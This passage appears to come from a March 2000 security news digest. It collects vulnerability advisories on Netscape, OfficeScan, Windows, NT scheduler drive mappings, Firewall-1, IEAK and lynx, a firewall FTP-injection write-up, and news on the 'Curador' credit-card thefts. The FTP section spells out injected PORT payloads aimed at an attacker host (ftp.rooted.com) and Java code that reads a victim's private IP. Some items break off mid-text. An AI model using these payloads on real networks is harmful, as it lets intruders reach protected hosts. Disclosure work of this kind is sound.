      the certificate is expired and replaced with a new certificate, and
      thus the user can continue to access the site without a warning
      stating that the certificate is expired and that a new certificate exists
      for the site (it apparently only checks to see if the new certificate
      isn't expired.) Manually verifying the old certificate in the database
      will prove that the certificate is invalid. When the site is properly
      reissued a certificate, Netscape automatically trusts the
      newcertificate based on the previous certificate...if the
      previouscertificate is removed from the database and the website is
      re-accessed, the standard warning appears asking the user if they
      wish to trust thecertificate. Since the new certificate is
      cryptographically differentfrom the old certificate, no trust
      relationship should exist (only thesigner is the same.)

      Netscape does not replace the old expired certificate with the
      newcertificate, and does not add the new certificate to the database.
      Nor does it tell the user that the new certificate a site is sending
      does not match a previous certificate.

      Why is this a problem? 

      The problem is that there is an inherited trust between an
      expiredcertificate and an active certificate, where there really
      shouldn't be. If any trust should be there, it certainly shouldn't be
      with an expired certificate. The idea here is that Netscape should
      complain about a site which has a certificate different than what
      Netscape has in its database. When you accept a certificate from a
      website which you do not already hold a trust with the signer of the
      certificate, you should be warned if that certificate is no longer valid
      or when the server has been issued a new one. You are trusting that
      certificate and its signer, not that site. If the site's certificate
      changes, you should be warned about the change and asked if you
      still want to trust the site. If a hacker manages to gain access to the
      key and the certificate, and changes the key and thecertificate, a
      warning may be the only thing to protect you from thathacker
      becoming a man in the middle to the attack.

      What should be the solution?

      An option, in the browser, to allow the user to be warned the first
      time a certificate changes on a webserver. If the previous certificate
      isexpired, and the current certificate on a site is different, the
      usershould be warned of the change, and asked whether they wish
      the newcertificate to replace the previous one. That way, paranoid
      users like myself can be warned when a certificate changes, so that
      we can decidewhether the new certificate should be trusted. Of
      course, if I already trust the certificate signer, then I shouldn't be
      prompted about thecertificate.

101.0 HNS:"OfficeScan DoS & Message Replay" Vulnerability
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      From HNS http://www.net-security.org/

      Posted @ March 17, 2000

      Edition - version 3.51 - that eliminates two security vulnerabilities
      found on previous versions ... 
      
      OfficeScan DoS & Message Replay" Vulnerability
      Posted to BugTraq on March 17, 2000

      Summary
      =======
      Trend Micro has released a new version of OfficeScan Corporate
      Edition - version 3.51 - that eliminates two security vulnerabilities
      found onprevious versions. Previous versions of OfficeScan allow
      intruders within a firewall to initiate a DoS attack on the OfficeScan
      client (tmlisten.exe) as well as to capture OfficeScan commands.
      These commands can be replayed and used to change other
      OfficeScan client configurations.

      Issues
      ======
      Trend OfficeScan version 3.5 or earlier versions perform incomplete
      parsing and buffer overflow checking in its Windows NT client. If a
      malicious user, has the ability to telnet and submit some form of
      message to the OfficeScan NT client, OfficeScan service consumes
      100% CPU processing power. Inaddition, communication between
      the OfficeScan server and client wasestablished with insufficient
      encryption and authentication, which allows a malicious user to sniff
      and replay OfficeScan commands.

      Implementation
      ==============
      Trend Micro has corrected the DoS attack issue by correctly parsing
      and handling commands or arbitrary messages sent to the
      OfficeScan client.

      Trend Micro has implemented MD5 Message-Digest Algorithm to
      ensure that the commands between the server and the clients can
      not be decrypted or captured to be replayed to other clients. For
      details about the MD5 encryptionalgorithm see:
      http://theory.lcs.mit.edu/~rivest/rfc1321.txt

      Microsoft has released a patch that eliminates a security
      vulnerability in Microsoft(r) Windows(r) 95, Windows 98, and
      Windows 98 Second Edition. The vulnerability could cause a user's
      system to crash, if they attempted to access a file or folder whose
      path contained certain reserved words.

      Frequently asked questions regarding this vulnerability can be
      foundat
      http://www.microsoft.com/technet/security/bulletin/fq00-017.asp.

      Issue
      =====
      DOS device names are reserved words, and cannot be used as
      folder or file names. When parsing a reference to a file or folder,
      Windows correctly checks for the case in which a single DOS
      device name is used in the path, and treats it as invalid. However, it
      does not check for the case in which the path includes multiple
      DOS device names. When Windows attempts to interpret the device
      name as a file resource, it performs an illegal resource access that
      usually results in a crash.

      Because it is not possible to create files or folders that contain
      DOSdevice names, it would be unusual for a user to try to access
      one under normal circumstances. The chief threat posed by this
      vulnerability is that a malicious user could attempt to entice a user
      to attempt such an access. For instance, if a web site operator
      hosted a hyperlink that referenced such a path, clicking the link
      would result in the user's machine crashing.Likewise, a web page or
      HTML mail that specified a local file as the source of rendering
      information could cause the user's machine to crash when it was
      displayed. If this happened, the machine could be put back into
      normalservice by restarting it. 

      Affected Software Versions

      Drive Mappings in Interactive Login
      Posted to BugTraq on March 15, 2000

      Issue: Drive Mappings in Interactive Login affect Processes running
      in context of Schedule User. 

      Points indicating this is a bug/security exploit and not by design (as
      somehave indicated to me) 

      1. Drive mappings are individual to each user, as seen by their
      location in the registry under HKCU\Network. This point alone
      indicates a bug. Why should the *personal* drive mappings of an
      interactive login session have *any* affect on a service running in a
      different user context, in a supposedly secure environment? They
      shouldn't, plain and simple. 

      2. KB Article Q130668 is the only article I could find which has any
      relationship to this issue, but it deals with a "bug" when the drives
      are mapped to Netware Volumes using GSNW. However, reading
      between the lines, one can see that the behavior described (which is
      identical in both Netware and NT drive mappings) is not by design,
      otherwise, why would they state this: Microsoft has confirmed this
      to be a problem in Windows NT Workstation and Server versions
      3.5, 3.51, and 4.0... They do offer up a solution to one half of the
      problem - that is when the scheduled process leaves a mapped
      drive, which then affects any interactive processes by preventing the
      use of this drive (unless appropriate permissions exist for the
      interactive user). But they make no mention of the other half - that a
      non- privileged user can affect the environment of the scheduled
      process, which is often in a priviliged account context. 

      Take the following scenario: 

      A "secure" NT workstation is configured with scheduler running in a
      user context that has specific elevated rights in order to perform
      unattended administrative functions based on scripts that are stored
      on a server. But one of the tasks performed in these scripts requires
      a mapped drive letter; UNC paths won't work. So to be sure, the
      scripts begins by mapping a drive letter to the shared network
      resource containing the patches and updates placed there when
      required. Often these patches are security fixes and the like, and
      the scheduler dutifully applies them to some large number of
      machines as directed in the script. 

      Here comes the exploit. If an interactive login is present, and the
      same drive letter is already mapped by a user, the net use in the
      scheduled script will fail, as will the required hotfix or update. Not a
      pretty picture in a large LAN whose security and stability may rely
      on timely installation of these updates. This is the simplest
      "exploit". 

      Next we extend this a bit further: the user maps a drive letter in an
      interactive login, and places in it a script with the same filename as
      that called by the scheduled update, and makes sure the schedule
      user has permissions to this file and network resource. All of this
      could be performed by a non- privileged user. The schedule service
      will now execute this script in the elevated user context, and the
      script could be instructed to install a trojan, add the user to the local
      Admin group, or whatever. The bottom line is that this design flaw
      can be easily exploited to allow any user with interactive login rights
      to a workstation to elevate himself to the rights of the schedule user,
      which is often Administrator of the workstation. 

      I have tested this on NT4 SP5 and 6a. (Note this is without IE5
      installed, just the built in AT scheduler). I have also tested this with
      all combinations of Local and Domain accounts for both the
      scheduler and the interactive user. I have tested it with and without
      persistent drive mappings present for either user - in each case,
      whoever gets the login first gets the drive letter.

      Problem with Firewall-1
      Posted to BugTraq on March 15, 2000

      The Dartmouth Collage security group has uncovered a problem
      withFirewall-1 which could lead to the protected site handing out
      more IPaddress info than intended.

      Under certain nominal load conditions (CPU less than 40%, 200+
      activesessions) Firewall-1 will begin "leaking" packets with their
      privateaddress information in tact. The result is that the receiving
      site willreceive a SYN=1 that it will be unable to respond to. Once
      the clientattempts a resend, the target network (or anyone in the
      middle) can usethe source port information to enumerate the client's
      true IP address.

      Here is a Snort trace which has been sanitized and formatted for
      easierviewing:

      Mar 9 14:01:19 172.30.1.10:1721 -> 192.168.1.5:80 SYN **S*****
      Mar 9 14:01:48 200.200.200.5:1721 -> 192.168.1.5:80 SYN **S*****
      Mar 9 14:04:35 172.30.1.10:1858 -> 192.168.1.5:80 SYN **S*****
      Mar 9 14:05:05 200.200.200.5:1858 -> 192.168.1.5:80 SYN **S*****
      Mar 9 14:23:25 172.16.5.20:4868 -> 192.168.1.5:80 SYN **S*****
      Mar 9 14:23:51 200.200.200.5:4868 -> 192.168.1.5:80 SYN **S*****

      So the first packet goes out with the private address information
      stillin place and SYN=1. When the client does not receive a reply,
      itretransmits the SYN=1. Since FW-1 considers this to be part of
      the samesession, the same source port number is assigned. If the
      second packetgets translated properly (as in these traces) the
      source port info canpotentially be used to map the legal IP address
      to the private address.

      Of course the problem here is that a would be bad guy now knows
      theclient's true IP address. If enough hosts are recorded, its
      possiblethat most of the internal network address space could be
      enumerated.

      This problem has been noted on Firewall-1 versions 3.0b & 4.0. 4.1
      hasnot been checked but its expected that the same problem may
      exist. Wewhere able to reproduce the problem on a Nokia IP440 and
      NT. I've seenthis problem on Solaris 2.6 as well, but do not have the
      data to back upthe statement.

      A quick fix is to apply egress filtering to the border router and
      blockall private addressing that attempts to leak though. A how-to
      on egresscan be found at:

      Freeze Distribution of IE 5.0, 5.0a, and 5.0b
      Posted to BugTraq on March 15, 2000

      Microsoft has just discovered a serious problem when a user
      attempts toinstall the 128-bit security patch for Internet Explorer 5.0,
      5.0a and5.0b on Windows 2000 as part of an IE5.0 IEAK package.
      After restartingthe system, users will not be able to logon to
      Windows 2000.

      The instructions to incorporate the 128-bit security patch into
      IEAKpackages say you should use the command line switches:
      "/q:a /r:n /n:v"
      The /n:v switch when used with ie5dom.exe (the 128-bit security
      patch for5.0x) causes important security files on Windows 2000 to
      be replaced witholder files, preventing users from logging on.
      Installations created using IEAK 5.0 for Windows 95, Windows 98,
      andWindows NT4 systems with the ie5dom.exe, and these
      command line parametersspecified, are not affected.

      It is critical that you freeze distribution of IE 5.0, 5.0a or 5.0b
      buildsthat incorporate the 128-bit security patch with these
      switches. Pleasetake immediate action to help prevent more
      customers from encounteringthis issue.

      Please checkhttp://www.microsoft.com/windows/ieak/en/support

      We sincerely apologize for this inconvenience and thank you in
      advance foryour help in protecting end users.

      Thank you, The IEAK Product Team

      Checking to see if you have included this command-line switch:

      To check a package for this issue:

      Open your IEAK package in the IEAK Wizard and go to the Custom
      Componentsscreen. Examine each custom component. If you have
      included ie5dom.exe asa custom component, check the command
      line switches for '/R:N /Q:A /N:V'

      *OR*

      If you don't have the IEAK Wizard available to you:

      1) Extract your custom IE 5.0x package by running this command
      line:'ie5setup.exe /c /t:'

      2) Browse to the directory. Open 'iesetup.cif' in Notepad.

      3) Look for a section like this:

      - Rewrote a couple of paragraphs that were causing much head

      Synopsis

      It is possible to cause many firewalls to open arbitrary ports allowing
      external hosts to connect to "protected" clients.

      In this case, it is done by fooling the protected client into sending a
      specially crafted FTP request through the firewall, which it
      misinterprets as a legitimate FTP "PORT" command.

      Basic idea : how to open arbitrary ports against a client

      * Send a HTML email to an HTML-enabled mail reader containing
      the tag


      You could also conceivably plant a web page somewhere on a
      server containing this link. Please reference CERT advisory
      CA-2000-02: Malicious HTML Tags Embedded in Client Web
      Requests http://www.cert.org/advisories/CA-2000-02.html

      * Balance the number of A so that the PORT command will begin on
      a new packet boundary. This may also be done by having the server
      use a low TCP MSS to decrease the number of A's that one has to
      add.

      * The firewall in question will incorrectly parse the resulting RETR
      /aaaaaaaa[....]aaaaaPORT 1,2,3,4,0,139 as first a RETR command
      and then a PORT command and open port 139 against your address
      (1.2.3.4 in this case)

      * Now the server ftp.rooted.com can connect to the client on port
      139. Ouch.

      Before you ask:
      No, it does not have to be port 139. It can be any port. Some
      firewalls disallow "known server ports" for these connections; such
      ports cannot be used, but I'm betting there are plenty other ports
      that can be used in such cases.

      Address translation playing games

      You have to know the IP address of the client in order to fool the
      firewall into opening the port.

      If the client is not dynamically NATed, this is easy.

      If the client IS dynamically NATed, this is a bit harder.

      How to make it work through address translation

      There are several ways to figure out what the private address is.
      Here's two:

      * Send an email to the address in question containing an img src
      ftp://ftp.rooted.com:23456 and hope that the firewall won't realise
      that port 23456 is FTP. PORT commands won't be translated this
      way, so the private IP adress will be exposed. This assumes that
      23456 is allowed through the firewall and that it won't attempt to
      parse FTP command data on that port.

      * Send an email with a link to a web page that contains javascript
      that extracts the private IP address and posts it to the server.

      The javascript code below works on Netscape; I don't know what the
      equivalent is for MSIE.

      vartool=java.awt.Toolkit.getDefaultToolkit();
      addr=java.net.InetAddress.getLocalHost();
      ip=addr.getHostAddress();

      Once we know about the IP address, we can adjust the img src so
      that it is valid for that specific internal client.

      The dynamic translation will also likely change the port number
      opened on the NAT:ed public address, but that's ok. All we have to
      do is have our fake FTP server read the command packet containing
      the PORT command, as changed by the firewall, and we'll know
      what public address and port to connect to in order to get to our
      desired port on the "protected" client.

      I think I've heard about reverse firewall penetration before

      Yeah, the idea of internal users fooling a firewall to let them out isn't
      new, but the scope of this vulnerability is "new" IMHO.

      Basically, you can get at anyone with a browser or HTML-enabled
      mail reader protected by firewalls that have more than 50% market
      coverage. That's bad.

      What about Checkpoint's FTP PASV fix for FW-1?

      Checkpoint's fix for FW-1 is to make sure that every packet in the
      command stream ends with CRLF (0x0a 0x0d in hex). That would
      help against the above attack, but not if we modify it a wee bit:

      src="ftp://ftp.rooted.com/aaaaaaa%0a%0dPORT 1,2,3,4,0,139"

      Ouch. This WILL work in Netscape v4.7 (I've verified it using a
      network sniffer, anyone care for a packet dump?).

      The firewall will see this as two separate commands: RETR
      aaaaaaaaaa PORT 1,2,3,4,0,139

      which means that poorly implemented proxies are likely to be
      vulnerable aswell.

      This in and of itself is a browser bug IMHO. Line feeds are not valid
      characters in a file name.

      Added: 2000-03-14

      Apparently, this CRLF variant will _not_ work in MSIE (version
      unknown?). It's doing the right thing: stripping out the CRLF.
      (Second hand info, I have not verified MSIE's behaviour)

      No information on other browsers or mail readers.

      Other fixes?

      I havent seen other firewall vendors make public claims that they
      protect against any of these attacks. Cisco is apparently working on
      a fix for PIX, but it's taking time, so I'm guessing they're doing it the
      right way - since doing it the right way really does take quite a bit of
      time.

      It would seem like all the others are silently going to sneak fixes into
      their upcoming updates and pretend like they never were vulnerable
      in the first place. Grumble.

      Added: 2000-03-14

      I suspect that FW-1's security servers may disable this attack.
      (Dunno, I'm not an FW-1 user)


      What firewalls are likely to be vulnerable?

      This specific attack is likely to work against most "stateful
      inspection" firewalls with poorly implemented application layer filters.
      This probably includes most products out there.

      It may also affect poorly implemented "proxies" when the CRLF is
      added before the PORT command as described above.

      Added: 2000-03-14

      Checkpoint FW-1 v3 is likely to allow connections on most ports
      1024-65535 with full bidirectional communication

      Checkpoint FW-1 v4 is likely to allow connection on most ports
      1024-65535 with only unidirectional communication

      Cisco PIX is likely to allow connections to any port with full
      bidirectional communication

      Linux's ip_masq_ftp module is _really_ easy to fool, according to
      Solar Designer. It will accept a "PORT" command anywhere in a
      packet. This means that even this is likely to work:
      "http://rooted.com:21/PORT 1,2,3,4,0,139"

      This is likely NOT a complete list. And no, I'm not going to get in
      touch with vendors and report the vulnerability. There are just too
      many that are likely to be affected.


      "The great picture"

      Other protocols than FTP are likely to be affected by this type of
      vulnerability - pretty much any protocol that opens up ephereal ports
      after the initial command session. A couple that come to mind are:

      * Oracle SQL*Net (versions using separate data channels)
      * RealAudio/Video (secondary UDP channel)
      * H.323 (NetMeeting et al)
      THIS IS NOT A COMPLETE LIST. Those were just a couple of
      common ones off the top of my head.


      Workarounds to this specific vulnerability

      * Disable active FTP. Errrr, wait. The fix for the server side
      vulnerability was to disable passive FTP. Let's rephrase that:

      * Disable FTP altogether. Block port 21. Disable FTP Application
      Layer Filters on all ports in your firewall.

      * If you can't change the settings in your firewall, set the "FTP
      Proxy" setting in your browser/HTML-enabled mail reader to some
      address that doesn't exist, like 127.0.0.2. After this change, your
      browser won't be able to connect anywhere using FTP.
      (From Solar Designer: This does not help if you're using
      ip_masq_ftp, since it'll be fooled by HTTP looking like FTP.)

      FreeBSD-SA-00:08                                           Security Advisory
                                                                      FreeBSD, Inc.
      
      Topic: Lynx ports contain numerous buffer overflows
      
      Category:       ports
      Module:         lynx/lynx-current/lynx-ssl/ja-lynx/ja-lynx-current
      Announced:      2000-03-15
      Affects:        Ports collection before the correction date.
      Corrected:      See below.
      FreeBSD only:   NO
      
      I.   Background
      
      Lynx is a popular text-mode WWW browser, available in several versions
      including SSL support and Japanese language localization.
      
      II.  Problem Description
      
      The lynx software is written in a very insecure style and contains numerous
      potential and several proven security vulnerabilities (publicized on the
      BugTraq mailing list) exploitable by a malicious server.
      
      The lynx ports are not installed by default, nor are they "part of FreeBSD"
      as such: they are part of the FreeBSD ports collection, which contains over
      3100 third-party applications in a ready-to-install format.
      
      FreeBSD makes no claim about the security of these third-party
      applications, although an effort is underway to provide a security audit
      of the most security-critical ports.
      
      III. Impact
      
      A malicious server which is visited by a user with the lynx browser can
      exploit the browser security holes in order to execute arbitrary code as
      the local user.
      
      If you have not chosen to install any of the
      lynx/lynx-current/lynx-ssl/ja-lynx/ja-lynx-current ports/packages, then
      your system is not vulnerable.
      
      IV.  Workaround
      
      Remove the lynx/lynx-current/lynx-ssl/ja-lynx/ja-lynx-current ports, if you
      you have installed them.
      
      V.   Solution
      
      Unfortunately, there is no simple fix to the security problems with the
      lynx code: it will require a full review by the lynx development team and
      recoding of the affected sections with a more security-conscious attitude.
      
      In the meantime, there are two other text-mode WWW browsers available in
      FreeBSD ports: www/w3m (also available in www/w3m-ssl for an SSL-enabled
      version, and japanese/w3m for Japanese-localization) and www/links.
      
      Note that the FreeBSD Security Officer does not make any recommendation
      about the security of these two browsers - in particular, they both appear
      to contain potential security risks, and a full audit has not been
      performed, but at present no proven security holes are known. User beware -
      please watch for future security advisories which will publicize any such
      
      vulnerabilities discovered in these ports.

      Alleged Hackers Arrested

      The FBI said Friday that two 18-year-olds had been arrested in Wales for 
      allegedly hacking into nine e-commerce websites around the world and 
      stealing credit card information. 

      The losses connected with the intrusions on websites in the United States, 
      Canada, Thailand, Japan, and Britain could exceed US$3 million, the FBI 
      said in a news release. 


      It said the theft of credit card information related to more than 26,000 
      accounts, the alleged scheme involved the disclosure of the data on the 
      Internet, and that the accused hackers used the screen name "Curador." 

      The two youths, who cannot be identified under British law, were arrested 
      Thursday by the Dyfed-Powys Police Service in Wales for violating 
      Britain's Computer Misuse Act, the FBI said. 

      The arrests stemmed from an FBI investigation conducted with the Welsh 
      police, the Royal Canadian Mounted Police, and Internet security 
      consultants, the FBI said, adding that the international banking and 
      credit card industry also provided substantial cooperation. 

      The FBI still is investigating last month's wave of cyber attacks that 
      disrupted some of the Internet's most popular sites. The FBI has yet to 
      make any arrests or bring any charges involving those attacks. 

      The FBI's own website was attacked March 14, the same day the agency 
      celebrated the 50th anniversary of its "Ten Most Wanted Fugitives" list, 
      which is publicized on the site,
      FBI officials said.

      March 27  While the FBI was quick to take credit
      for the arrest last week of two teen-agers who
      allegedly stole information on 26,000 credit cards
      from Internet retailers, a Canadian computer
      security consultant working with British
      authorities tracked the suspects back to their small
      village in Wales before the U.S. agency even got
      involved, MSNBC.com has learned.
      
      A PRESS RELEASE issued Friday by the FBI said the
     arrests of the two 18-year-olds .came as a direct result of an
     FBI investigation.. 
            It added that unidentified Internet security consultants
     had assisted in the case, but nowhere did it mention Chris
     Davis of HeXedit Network Security Inc. of Ottawa, Ontario,
     who worked for nearly two months assembling the evidence
     that led authorities to the suspects. 
            In interviews with numerous news organizations,
     including MSNBC.com, after the announcement, the FBIs
     Michael Vatis said the arrests should serve as a warning to
     others who would use the Internet to steal.
            .Its important to say that anyone who underestimates
     the skill of our agents ... does so at their own peril,. he said.
            
     FBI PLAYED LIMITED ROLE
            But interviews with Davis and other participants in the
     case show that the FBIs role in the investigation of
     .Curador. was limited.
            .They (the FBI) did get involved fairly late,. Davis said
     Monday. .By the time they got involved, (British police) had
     phone numbers, home addresses and all that..
             
                                     Phone calls to the
                              National Infrastructure
                              Protection Center, which
                              Vatis heads, were not
                              returned Monday. A
                              spokesman for the FBI
                              declined to comment.
                                     .In anything like this,
                              it really doesnt serve any
                              purpose to go back and
                              try to heap credit one way
                              or the other,. said the
                              spokesman, Paul Bresson.
                              .I think the facts speak for
     themselves.. 
            But officials of Promobility.net, a wireless phone seller
     in Ontario that was among the sites hit by .Curador,.
     confirmed Davis account.
            .That is 100 percent accurate,. spokesman Eric Geiler
     said. .He could have knocked on [the suspects] doors two
     weeks before the FBI did..
            Davis, who has been a computer security consultant for
     nearly four years, said he got involved in the case in early
     February after reading a boastful post from .Curador. 
     the online alias that authorities say was jointly used by the
     two 18-year-old suspects  on HackerNews.com about
     the theft of credit card information from two e-merchants.
     The credit card information was subsequently posted on a
     Web site by .Curador,. who said he took the action to
     publicize the lack of security at many e-commerce sites.
            
     THATS PRETTY LOW
            .I read the boast and I thought, Thats pretty low,.
     said Davis. .I checked and both sites seemed like fairly
     small mom-and-pop type operations and I felt sorry for
     them. So I fired off an e-mail and said and said, Ill help
     you secure your site. They wrote back and said they had
     no idea theyd even been hit (by hackers)..
            Both Promobility.net and Ltamedia.com, a Knoxville,
     Tenn., seller of .life-enhancing products,. agreed to turn
     over their computer logs to Davis so he could determine
     how the intruders had gained entry to their systems and
     close the security holes.
            Looking through the logs, Davis discovered that the
     intrusions were accomplished using two known security
     holes in Microsofts Internet Information Server, or IIS.
     While Microsoft had issued .patches. to correct the holes
     months earlier, none of the nine Web sites in the United
     States, Canada, Thailand, Japan and the United Kingdom
     that were hit by .Curador. had updated their software to
     eliminate the problem. 
            (Microsoft is a partner in MSNBC.com.)
            While he could have simply fixed the flaws and
     returned to his paying jobs, Davis found himself growing
     increasingly fascinated by the case and pressed on. 
            By analyzing e-mail sent through a free service that the
     hackers wrongly thought would shield the IP address, Davis
     was quickly able to determine that .Curador. was using an
     Internet service provider in England. He then contacted
     Scotland Yard, which referred him to police in South
     Yorkshire, who determined from records obtained from the
     ISP that the .crackers.  the term for computer criminals
     preferred by law-abiding hackers  were in Wales.
            
     SEARCH NARROWS TO TWO HOUSES
            Soon, the British investigators tightened the circle to the
     tiny fishing village of Clynderwen, population 500, and
     ultimately to two houses in the village.
            It was then, Davis said, that he heard from the FBI,
     which learned from the Royal Canadian Mounted Police
     that he was working on the case while investigating the
     thefts from U.S. Web sites. 

                                     .They were able to
                              quickly obtain logs from
                              everybody who had been
                              affected in the U.S. 
                              and I explained how
                              Curador had broken in,
                              showing them, Heres the
                              line from the log, heres
     how he exploited the security vulnerability..
            The FBI, working with the RCMP and the Welsh
     Dyfed-Powys Police Service, orchestrated the arrests on
     Thursday of the 18-year-old suspects. The teenagers were
     questioned for 12 hours after their arrest before being
     released on bail as the investigation continues, Welsh police
     said Monday.
            In accordance with British law, neither of the suspects
     was publicly identified. But one, Raphael Gray, has given
     numerous interviews since his release to say that he had
     acted only to highlight the lack of security on many retail
     Web sites. 
            .I have done the honest thing, but I have been

     of London. .Thats why I posted the information on the
     Internet..
            
     CURADORS CLAIMS
            Authorities have not identified the nine e-commerce
     sites they say were burgled, but according to .Curadors.
     Web sites others include Feelgood Falls; Sales Gate;
     Shopping Thailand; Vision Computers; NTD Media and the
     American Society of Clinical Pathologists. 
            Gray has maintained in interviews since his arrest that
     neither he nor his friend had used the stolen credit card data
     for personal gain  an assertion backed up by a British
     businessman who said he hired Gray to run his e-commerce
     site.
     
            .Id have to give him money to buy lunch or get a
     haircut,. the businessman told MSNBC.com on Monday. 
            The businessman, who contacted MSNBC.com,
     agreed to talk about Gray on the condition that neither he
     nor his Web site be identified because he feared it would be
     bad for business.
            His account could not be independently confirmed, but
     his description of Gray was consistent with other published
     accounts.
            The businessman said Gray worked part-time for him
     for two to three months and was in charge of the companys
     Web site, which sells video games. He was fired on March
     2 because of chronic absenteeism, he said.
            
     HE KNEW HIS STUFF
            .He was very good at his job,. said the man. .Didnt
     turn up very often and his personal hygiene wasnt too
     good, but he knew his stuff. 
            .He worked developing my companys e-commerce
     site, which he claimed was going to be the most secure in
     the business. What I didnt realize was that I had one of the
     worlds biggest credit card hackers looking after my
     customers..
            Meanwhile, a claim by Gray that a credit card
     belonging to Microsoft founder Bill Gates was among the
     credit cards he and his friend are accused of stealing was
     determined to be false on Monday. 

      Gray told the Sunday Telegraph that he had sent information
     on a number of the cards, including Gates card, to a U.S.
     Web site registered to NBC. (NBC is a partner in MSNBC.com.)
     
            But examination of one of the Web sites posted by
     .Curador. showed an entry about William F. Gates. The
     Microsoft founders name is William H. Gates. The credit
     card number listed also had too few digits to be valid, and
     both Microsofts address and Gates e-mail address were
     incorrect. 
            Gray and his friend could face charges under Britains
     Computer Misuse Act of 1990.
            They also could eventually be extradited to face
     charges in the United States, the FBIs Vatis told
     MSNBC.com on Friday.
            .The primary consideration is whats in the interest of
     justice,. said Vatis. .... We have obviously been
     investigating violations of U.S. federal criminal law..
            The teens are alleged to have caused losses that Vatis
     said could amount to more than $3 million, based on the
     cost of canceling the 26,000 credit card accounts and
     issuing new cards. And Vatis said that was .just one
     measure of possible loss.. Other costs could arise from any
     fraudulent use of the credit card numbers, as well as the
     expense of repairing compromised Web sites, he said.

            The arrests in Wales appear to represent the first major
     international response to a rapidly growing field in computer
     crime. Earlier this month, in response to an MSNBC.com
     investigation of international online credit card theft,
     spokesmen for the FBI and other organizations involved in
     fighting cybercrime said they could not recall any past
     prosecutions in such matters. 
            On Friday, Vatis said he could easily think of
     .international hacking incidents. that have led to
     prosecutions, but not in the context of online credit card
     information.
            Many such cases are under investigation, he said. Vatis
     said the international hurdles to investigating Internet crime
     were not as high as some people might think, contending
     that the FBI was .building more and more bridges every
     day. with law enforcement agencies in other countries.

      Can hackers kill credit cards?
     
      Spate of e-commerce intrusions might mean a new form 
      of payment system will come sooner than expected
      By Bob Sullivan
      MSNBC

      March 24  He calls himself .The Saint of
      E-commerce.. Two months ago, .Curador. started
      posting his catalog of stolen credit card numbers
      on his Web page. He stole database after database
      from a variety of e-commerce sites, each time
      updating his site, then gleefully mailing
      notification to reporters. He topped 25,000 records
      from 13 Web sites. Despite all that the financial
      risk and all that violation of personal privacy, no
      one could stop him. But now authorities in Wales
      have arrested two 18-year-olds on charges related
      to the Curador thefts.
               
            AUTHORITIES, OF COURSE, had always removed
     Curadors Web site  at least a dozen times. No matter; he
     used the many free, anonymous Web hosting services
     available on the Internet. And as fast as his Web page is
     taken down, .Curador. would put up another one. 
            The 18-year-old computer intruder, who also goes by the
     nickname .mind gimp,. told MSNBC in a telephone interview
     only that he was located somewhere in Europe.
            He wasnt using the credit cards for financial gain, he
     said The self-proclaimed .Saint of E-commerce. said he
     simply wanted to embarrass the victim Web sites into
     employing better security. He promised to continue breaking
     into e-commerce sites and posting stolen numbers .until I
     dont need to do it anymore or until I get arrested..
            But until Thursday, as MSNBCs Mike Brunker
     reported earlier this month, there hadnt been a single
     reported arrest of a foreign credit card thief by U.S.
     authorities. 

            Curadors thefts are just another story in this years
     litany of tales surrounding online theft of personal and
     financial information. E-merchants are furiously fighting the
     battle to keep down fraud costs, and consumer confidence
     in Internet safety is continually shaken, with no apparent end
     in sight. So some experts think Curador may just be another
     nail in the coffin of a credit card system that was hardly
     designed for Internet purchasing.
            .Anyone whos serious about this is getting a lesson.
     The wake-up call is here. The time is now,. said Stephen
     Orfei, vice president of electronic commerce and emerging
     technology for MasterCard International. Orfei is also the
     spokesperson for SETCo, the Visa- and
     MasterCard-backed organization pushing SET, a new
     payments protocol designed to limit electronic fraud.
            
     HOW CAN WE DO MORE?
            The raging success of online thieves, some say, will
     force the hand of banks, merchants, credit card companies
     and consumers to change the way we spend money much
     sooner than we intended.
            The high-profile hacks have at least gotten the attention
     of merchants, said Alyxia Do, electronic payment and smart
     card analyst with Frost & Sullivan. 
             
                                     .It seems that there
                              have been a greater
                              number of queries coming
                              in,. she said. .It began
                              with the CD Universe
                              break-in and it has just
                              continued to be in the
                              news. I have heard more
                              and more merchants are
                              going back to Visa and
                              MasterCard and asking,
                              How can we do more? .
                                     The stakes are higher
                              for merchants than
     consumers. While consumers face a limited liability of $50
     and a paperwork hassle, online merchants must write off
     credit card theft as .acceptable loss.. Hard data on how
     bad losses are is impossible to find, but anecdotally some
     industries relate fraud rates as high as 40 percent.
     Merchants use inexact software to filter out potential
     fraudulent purchases, but that means they turn away
     legitimate sales, too.
            The mathematics are alarming. In fact, according to Joe
     Barrett, chairman of the Internet Fraud prevention Advisory
     Council, in some industries, merchants are turning away 20
     percent of proposed sales.
            .Youre killing your business. Youd be better off
     taking every sale and self-insuring,. he said.
            
     SMART CARDS, FINALLY?
            "A number and a date and you can buy anything you
     want with it.. Thats how a teen-aged Internet credit card
     thief described to MSNBC the fundamental problem of
     using credit cards online. 

            The familiar plastic currency was designed to be
     physically handed to merchants, who could at least make a
     cursory check to see if signatures on the card and the sales
     slip matched. Online, commerce is anonymous. There is no
     way to see whos entering the credit card numbers into the
     Web page, an anonymity that heavily favors the fraud
     artists.
            Several technologies hope to tip the scales against
     thieves by implementing systems that require some
     real-world physical component when shopping online.
     Smart cards, the generic term for any plastic which includes
     an embedded microchip, are one promising solution.
            Smart cards, which identify the user through encrypted
     information embedded on the chip, must be inserted into a
     .card reader. attached to the computer. That means the
     card cant be used for e-commerce unless the purchaser is
     currently holding it.
            A PIN number is also required, so a thief needs to
     physically have the card and a security code in order to use
     it. Thats not an insurmountable hurdle, but a far more
     difficult one than using .a number and a date..
            Still, smart cards are 20 years old, and while there have
     been smatterings of adoption in Europe, trials of the
     technology in the U.S. have failed repeatedly. Consumers
     perceived them as inconvenient, and in the past they have
     been unmoved by the improvement in security.
             

            .In those trials, people still needed to carry around
     spare change anyway,. said Don Davis, editor of Card
     Technology Magazine. .They didnt really solve a problem
     for people. Now with the Internet, that changes things.
     There is a real problem to be solved with smart cards..
            And there appears to finally be momentum behind the
     chip-enabled cards. Microsoft and Sun are currently battling
     over the operating system used to run the cards, and
     Windows 2000 includes native support for the technology.
     But perhaps the biggest leap forward came last year, when
     American Express announced .Blue,. the first widely
     distributed smart card in the United States. Blue is a hybrid;
     it still has the old-fashioned magnetic strip and can be used
     as a traditional credit card. But the embedded chip can be
     used for online purchases, and it also can be updated with
     new software.
            Part of the fresh promise for smart cards comes from
     the changing economics in the industry. Card readers, which
     must be connected to every PC if smart cards are to be
     used, are now cheap enough to be given away. Thats
     exactly what American Express decided to do when it
     launched .Blue. last year.
